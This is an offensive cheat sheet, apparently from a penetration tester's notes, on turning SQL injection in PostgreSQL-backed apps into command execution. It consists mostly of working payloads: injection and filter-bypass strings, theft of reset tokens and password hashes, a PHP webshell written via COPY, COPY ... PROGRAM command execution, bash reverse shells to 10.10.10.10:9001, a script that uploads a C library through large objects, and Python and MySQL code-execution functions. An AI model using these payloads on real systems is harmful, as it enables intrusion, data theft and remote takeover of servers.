**PostgreSQL SQLi to RCE** — a SQL injection in a PostgreSQL-backed app becomes a shell when two things line up: the driver lets you stack a second statement, and the database role is a superuser (or holds `pg_execute_server_program`). Mechanically: confirm with a sleep, read what you need through a boolean or error oracle, then use the server's own file and program features (`COPY … PROGRAM`, large objects, a C function you upload) to run commands as the `postgres` OS user.

```
you -> app: id=1;SELECT pg_sleep(3)--            stacked statements?
you -> app: is_superuser / pg_execute_server_program?
  yes            -> COPY t FROM PROGRAM 'cmd'     one statement, done
  yes, filtered  -> .so via large object -> CREATE FUNCTION -> sys_eval('cmd')
  no             -> data only: pull hashes and reset tokens through the oracle
```

Everything below was run on PostgreSQL 16.15 (Debian) unless a line says otherwise.

## How it works

- **Stacked statements.** `COPY` and `CREATE FUNCTION` are statements, not expressions, so they need a `;`. A query sent as plain text (PHP `pg_query`, JDBC `Statement`, psycopg `execute` without parameters) accepts several statements. A prepared statement with bind parameters accepts one. Test it, do not assume.
- **Without stacking** you still have functions: `pg_sleep`, `pg_read_file`, `lo_import`, `lo_export`. That is file read and file write from inside a `SELECT`, but no command execution. `query_to_xml('COPY …')` does not get around it (`COPY is not allowed in a non-volatile function`).
- **Privilege.** A superuser can do all of it. Since PostgreSQL 11 three predefined roles split the file and program rights: `pg_read_server_files`, `pg_write_server_files`, `pg_execute_server_program`. An ordinary role gets `permission denied` on every step from "Files" down.
- **Who you become.** Commands run as the OS account that runs the server, normally `postgres`. It owns the data directory and not much else.

## Discovery

White-box: grep for queries built by concatenation, then turn on statement logging and watch your input arrive. See [[whitebox_cheatsheet]].

```sql
ALTER SYSTEM SET log_statement = 'all';
SELECT pg_reload_conf();
```

Black-box, in the order worth trying. Each one sleeps three seconds when it lands:

```
1;SELECT pg_sleep(3)--
1 AND 1=(SELECT 1 FROM pg_sleep(3))--
'||pg_sleep(3)--
1 AND 1=(CASE WHEN (1=1) THEN (SELECT 1 FROM pg_sleep(3)) ELSE 1 END)--
```

Only the first proves stacking. If the others sleep and it does not, you have an injection without stacked statements.

Then ask what you are:

```sql
SELECT current_user, current_setting('is_superuser');                    -- 'on' = superuser
SELECT pg_has_role(current_user, 'pg_execute_server_program', 'MEMBER');
SELECT pg_has_role(current_user, 'pg_read_server_files', 'MEMBER');
SELECT version();
```

## Exploitation

### 1. Read data through an oracle

Boolean (the page differs for true and false):

```
1 AND ASCII(SUBSTRING((SELECT current_user) FROM 1 FOR 1))>77
```

Time (no visible difference):

```
1 AND 1=(CASE WHEN (ASCII(SUBSTRING((SELECT current_user) FROM 1 FOR 1))>77) THEN (SELECT 1 FROM pg_sleep(3)) ELSE 1 END)
```

Error (the app prints database errors). One request per value, no guessing:

```
1 AND 1=CAST((SELECT string_agg(email||':'||reset_token,',') FROM users) AS int)
→ ERROR: invalid input syntax for type integer: "admin@victim.example:tok-8f3a"
```

Past the end of the string `SUBSTRING` is empty and `ASCII('')` is `0`, which is how a script knows to stop. The loop itself is in [[Exploit skeleton (Python)]].

Queries worth extracting:

```sql
SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'
SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users'
SELECT usename||':'||passwd FROM pg_shadow          -- superuser only; SCRAM hashes, slow to crack
```

For an auth bypass a reset token or session row from the app's own tables is nearly always faster than a password hash.

### 2. No quotes, no commas, no spaces

```sql
SELECT $$text$$                         -- dollar quoting: a string without ' or "
SELECT $x$it's fine$x$                  -- tagged, when the text contains $$
SELECT CHR(97)||CHR(98)||CHR(99)        -- 'abc'
SELECT SUBSTRING(email FROM 1 FOR 5)    -- no comma
SELECT email FROM users LIMIT 1 OFFSET 2
SELECT/**/1                             -- no space
SELECT(1)WHERE(1=1)
SELECT current_setting($$is_superuser$$)=$$on$$
```

A tab or a newline (`%09`, `%0a`) also separates tokens.

### 3. Files

Read:

```sql
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/etc/passwd', 0, 200);                  -- offset, length
SELECT encode(pg_read_binary_file('/etc/hostname'), 'base64');
SELECT pg_ls_dir('/var/lib/postgresql');
CREATE TABLE r(l text); COPY r FROM '/etc/passwd'; SELECT * FROM r;
```

Write:

```sql
COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/cmd.php';
```

`COPY … TO` writes one line of text and appends a newline. That is fine for a webshell when database and web server share a host and the `postgres` user can write to the web root. For binary files use large objects (step 5).

Where the server keeps its own files:

```sql
SELECT name, setting FROM pg_settings WHERE name IN ('data_directory','config_file','hba_file');
```

### 4. Command execution with COPY … PROGRAM

```sql
CREATE TABLE o(l text);
COPY o FROM PROGRAM 'id; uname -a';
SELECT * FROM o;
DROP TABLE o;
```

Blind, when you cannot read the table back:

```sql
COPY (SELECT 1) TO PROGRAM 'id > /tmp/proof';
```

Reverse shell, as one stacked statement:

```
1;COPY (SELECT 1) TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.10.10/9001 0>&1"'--
```

The HTTP request hangs for as long as the shell lives, because `COPY` waits for the program to exit. Send it from a thread or with a short client timeout.

### 5. Large objects: binary upload and download through SQL

A large object is a blob stored in `pg_largeobject` in 2048-byte pages, addressed by an OID that you may choose.

```sql
SELECT lo_import('/etc/passwd', 31337);               -- file -> object 31337
SELECT convert_from(lo_get(31337), 'UTF8');           -- object -> text, in a second statement
SELECT lo_from_bytea(31338, decode('aGVsbG8K', 'base64'));   -- create from bytes
SELECT lo_put(31338, 6, decode('d29ybGQK', 'base64'));       -- write at an offset
SELECT lo_export(31338, '/tmp/out.bin');              -- object -> file, byte for byte
SELECT lo_unlink(31337), lo_unlink(31338);            -- clean up
```

- `lo_import` and `lo_get` on the same object inside one statement fails (`large object … does not exist`). Use two requests.
- Upload anything larger than a URL allows in chunks: one `lo_put` per request at increasing offsets, then a single `lo_export`.
- Before 9.4 there is no `lo_from_bytea` or `lo_put`. The old route still works on 16: `SELECT lo_create(31339)`, then `INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31339, 0, decode('…','base64'))` with one row per 2048-byte page.

### 6. A C function of your own (UDF)

Use this when `COPY … PROGRAM` is filtered or you hold superuser on a version before 9.3. The server will `dlopen` any shared object you can put on its disk.

Source and a build for PostgreSQL 16 on x86-64 are in the vault: `WEB/Web Scripts/postgres-udf/udf.c` and `udf_pg16_amd64.so`. `sys_exec(text)` returns the exit status, `sys_eval(text)` returns the output.

Build for another version on a box with the matching headers:

```bash
apt-get install -y gcc libc6-dev postgresql-server-dev-16
gcc -fPIC -shared -I"$(pg_config --includedir-server)" -o udf.so udf.c
```

Turn the library into SQL, then send the statements one per request:

```python
import base64
data = open("udf.so", "rb").read()
OID, CHUNK = 31337, 2048
print(f"SELECT lo_create({OID});")
for off in range(0, len(data), CHUNK):
    b64 = base64.b64encode(data[off:off + CHUNK]).decode()
    print(f"SELECT lo_put({OID},{off},decode('{b64}','base64'));")
print(f"SELECT lo_export({OID},'/tmp/udf.so');")
print(f"SELECT lo_unlink({OID});")
```

Register and call:

```sql
CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/udf.so', 'sys_eval' LANGUAGE C STRICT;
SELECT sys_eval('id');
CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS int AS '/tmp/udf.so', 'sys_exec' LANGUAGE C STRICT;
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/10.10.10.10/9001 0>&1"');
```

The 16 KB library went up in eight `lo_put` statements and came back byte-identical.

### 7. Untrusted languages

If the server has a `pl*u` language package installed, a superuser needs no upload at all:

```sql
SELECT name FROM pg_available_extensions WHERE name ~ '^pl';       -- plpython3u, plperlu?
CREATE EXTENSION IF NOT EXISTS plpython3u;
CREATE OR REPLACE FUNCTION pyexec(c text) RETURNS text AS $$
import subprocess
return subprocess.run(c, shell=True, capture_output=True, text=True).stdout
$$ LANGUAGE plpython3u;
SELECT pyexec('id');
```

Shipping your own extension (control file, SQL script and library under the server's `extension` and `lib` directories) is the same UDF with packaging. On Debian packages those directories belong to root, so the `postgres` user cannot write there. Loading by absolute path, as in step 6, needs no such directory.

### MySQL, for contrast

Same idea with different names. Not executed for this note.

```sql
SELECT @@plugin_dir, @@secure_file_priv;        -- where libraries load from; '' means files are unrestricted
SELECT 0x7f454c46… INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';
SELECT sys_exec('id > /tmp/proof');
```

MySQL only loads from `plugin_dir`, and the library has to be built against the MySQL UDF interface (`lib_mysqludf_sys`), not the PostgreSQL one.

## Caution

- **Version boundaries, from the PostgreSQL documentation:** `COPY … PROGRAM` exists from 9.3; `lo_from_bytea`, `lo_put`, `lo_get` from 9.4; the three predefined file and program roles from 11.
- **The library must match the server.** A C library is tied to the server's major version and architecture through `PG_MODULE_MAGIC`; a mismatch is refused at `CREATE FUNCTION`. Read `SELECT version()` first and build for that. The stored `.so` is for 16 on x86-64 only.
- **A crash in your C code is a crash in the server.** Every connection is dropped while it restarts. Keep the function trivial and test it locally.
- **Windows targets:** the same steps with a DLL and a Windows path (or a UNC path to your share). Not tested here.
- **Clean up:** `DROP FUNCTION sys_exec(text); DROP FUNCTION sys_eval(text);`, drop the tables you made, `lo_unlink` every object, delete `/tmp/udf.so`, and `ALTER SYSTEM RESET log_statement` if you changed it.

## References

- PostgreSQL - COPY - https://www.postgresql.org/docs/current/sql-copy.html
- PostgreSQL - Server-side large object functions - https://www.postgresql.org/docs/current/lo-funcs.html
- PostgreSQL - C-language functions - https://www.postgresql.org/docs/current/xfunc-c.html
- PostgreSQL - Predefined roles - https://www.postgresql.org/docs/current/predefined-roles.html
- PayloadsAllTheThings - PostgreSQL injection - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
